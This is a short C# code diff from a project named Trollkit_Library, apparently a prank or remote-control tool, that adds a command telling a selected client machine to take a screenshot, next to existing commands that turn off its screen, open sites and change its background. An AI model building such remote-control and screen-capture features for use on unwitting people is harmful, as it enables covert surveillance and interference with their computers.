@@ -21,6 +21,8 @@ namespace Trollkit_Library.ViewModels.Commands
 		public ICommand TurnOffScreen { get { return new SendServerCommand(SendTurnOffScreen); } }
 		public ICommand OpenSite { get { return new SendServerCommand(SendOpenSite); } }
 		public ICommand PickBackgroundImage { get { return new SendServerCommand(SendBackgroundImage); } }
+		public ICommand MakeScreenshot { get { return new SendServerCommand(SendMakeScreenshot); } }
+
 
 		//textboxes
 		public string BroadcastMessageText { get; set; }
@@ -99,6 +101,15 @@ namespace Trollkit_Library.ViewModels.Commands
 				TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = base64 };
 				_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 			}
+		}
+
+		/// <summary>
+		/// Sends the screenshot command to the client
+		/// </summary>
+		private void SendMakeScreenshot()
+		{
+			TransferCommandObject returnObject = new TransferCommandObject { Command = "MakeScreenshot", Handler = handler, Value = "0" };
+			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
 	}
 }
